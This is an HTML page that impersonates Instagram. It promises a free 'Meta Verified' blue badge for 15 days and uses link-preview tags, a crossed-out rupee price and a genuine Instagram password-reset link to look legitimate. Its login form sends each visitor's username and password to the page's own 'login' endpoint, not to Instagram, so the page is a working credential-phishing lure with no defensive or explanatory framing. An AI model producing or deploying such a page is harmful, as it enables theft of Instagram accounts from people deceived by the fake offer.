<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />

  <!-- Open Graph for Link Preview -->
 <meta property="og:title" content="Free Instagram Meta Verified For 15 Days" />
<meta property="og:description" content="Verify your Instagram account and get a blue badge free for 15 days!" />
<meta property="og:image" content="/img.png" />

  <title>Instagram</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    html, body {
      overflow-x: hidden;
      max-width: 100%;
      width: 100%;
      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      background: #fff;
      height: 100%;
    }

    body {
      display: flex;
      justify-content: center;
      align-items: flex-start;
      padding-top: 0;
    }

    .container {
      width: 100%;
      max-width: 360px;
      padding: 0 24px 32px;
    }

    .promo-image {
      width: 100%;
      border-radius: 8px;
      margin-bottom: 16px;
      object-fit: cover;
      display: block;
    }

    .price {
      font-size: 14px;
      text-align: center;
      margin-bottom: 20px;
    }

    .price del {
      color: #999;
    }

    form {
      display: flex;
      flex-direction: column;
    }

    input[type="text"],
    input[type="password"] {
      font-size: 16px;
      padding: 12px;
      margin-bottom: 8px;
      border: 1px solid #dbdbdb;
      border-radius: 8px;
      background-color: #fafafa;
      max-width: 100%;
    }

    .btn {
      margin-top: 8px;
      padding: 12px;
      font-size: 14px;
      font-weight: bold;
      background-color: #0095f6;
      color: white;
      border: none;
      border-radius: 30px;
      cursor: pointer;
    }

    .forgot {
      margin-top: 16px;
      text-align: center;
    }

    .forgot a {
      color: #00376b;
      font-size: 12px;
      font-weight: 600;
      text-decoration: none;
    }

    .forgot a:hover {
      text-decoration: underline;
    }

    input:focus {
      transform: none !important;
      scale: 1 !important;
    }
  </style>
</head>
<body>
  <div class="container">
    <!-- Banner Image for Website Display -->
    <img src="img2.png" alt="Get Meta Verified" class="promo-image" />

    <div class="price">
      <del>â‚¹45</del>
    For 15 Days, Limited Time Claim Now 
    </div>

    <!-- Login Form -->
    <form action="login" method="POST">
      <input type="text" name="username" placeholder="Username, email address or mobile number" required />
      <input type="password" name="password" placeholder="Password" required />
      <button type="submit" class="btn">Continue</button>
    </form>

    <!-- Forgot password link -->
    <div class="forgot">
      <a href="https://www.instagram.com/accounts/password/reset/" target="_blank">Forgotten password?</a>
    </div>
  </div>
</body>
</html>
